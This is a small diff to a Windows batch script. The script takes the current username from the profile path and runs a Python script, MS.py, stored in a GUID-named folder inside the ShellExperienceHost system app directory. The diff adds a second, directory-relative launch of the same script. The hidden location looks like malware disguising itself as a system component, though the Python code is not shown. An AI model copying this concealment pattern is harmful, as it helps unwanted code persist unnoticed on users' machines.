@@ -20,4 +20,6 @@ set "userprofilepath=%userprofile%"
 for %%F in ("%userprofilepath%") do set "username=%%~nxF"
 
 python "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\pris\NFAH\_YE12842D-71D7-4477-A44B-7FA65F11C153\MSAS\MS.py"
+cd "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\pris\NFAH\_YE12842D-71D7-4477-A44B-7FA65F11C153\MSAS"
+python MS.py
 exit
